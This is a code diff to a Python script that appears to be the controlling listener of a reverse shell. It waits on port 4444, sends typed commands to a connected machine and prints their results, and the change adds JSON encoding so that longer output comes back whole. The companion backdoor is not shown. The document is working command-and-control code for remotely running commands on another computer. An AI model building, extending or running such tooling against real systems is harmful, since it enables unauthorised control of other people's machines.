@@ -9,6 +9,7 @@ That's really all there is to it.
 """
 
 import socket
+import json
 
 class Listener:
 
@@ -19,17 +20,27 @@ class Listener:
         self.connection, self.address = s.accept()
 
     def recieve_data(self):
-        return self.connection.recv(1024)
+        data = ''
 
-    def send_data(self, command):
-        self.connection.send(command)
+        while True:
+            data += self.connection.recv(1024).decode('utf-8')
+            try:
+                return json.loads(data)
+            except json.decoder.JSONDecodeError:
+                continue
+
+    def send_data(self, data):
+        packaged = json.dumps(data)
+        return self.connection.send(packaged.encode('utf-8'))
 
 
 def main():
+    print('[+] Starting Listener')
     listener = Listener('127.0.0.1', 4444)
+    print('[+] Connected to ' + listener.address[0])
 
-    command = input('^_^ >> ').encode('utf-8')
-    listener.send_data(command)
+    command = input('^_^ >> ')
+    listener.send_data(command.split(' '))
     print(listener.recieve_data())
 
     listener.connection.close()
